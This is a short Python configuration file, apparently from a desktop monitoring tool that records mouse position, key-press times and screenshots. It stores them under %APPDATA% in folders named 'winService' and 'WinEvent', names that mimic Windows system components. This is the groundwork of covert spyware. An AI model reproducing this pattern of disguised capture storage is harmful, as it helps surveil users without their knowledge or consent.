from os import getenv
from datetime import datetime
import DecryptionTests

stop_threads = False
mouse_position = ()
key_press_date = datetime.now()
last_screenshot_date = datetime.now()
unwantedWindowTitlesFilePath = getenv('APPDATA') + "\\" + "winService"
screenshotsPath = getenv('APPDATA') + "\\WinEvent"
DecryptionTests.DecryptionTests()
# 6 GB in bytes - 6442450944, max allowed folder size
MAX_ALLOWED_FOLDER_SIZE = 6442450944
# how often to check if folder with photos is too large, # execute check every 1 hour
FOLDER_CHECK_TIME_PERIOD_IN_SECONDS = 60 * 60 * 1
